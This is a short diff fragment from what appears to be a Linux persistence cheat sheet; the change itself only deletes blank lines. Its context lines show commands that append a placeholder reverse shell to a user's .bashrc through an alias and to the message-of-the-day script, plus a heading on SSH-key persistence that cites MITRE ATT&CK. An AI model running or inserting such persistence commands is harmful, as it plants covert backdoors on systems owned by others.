@@ -39,8 +39,6 @@ echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /home/$USER/.bashrc
 echo "$reversehell_goes_here" | sudo tee -a /etc/update-motd.d/00-header
 ```
 
-
-
 #### SSH Keys
 It's not very hidden, easy to remove or detect. - https://attack.mitre.org/techniques/T1098/
 ```bash
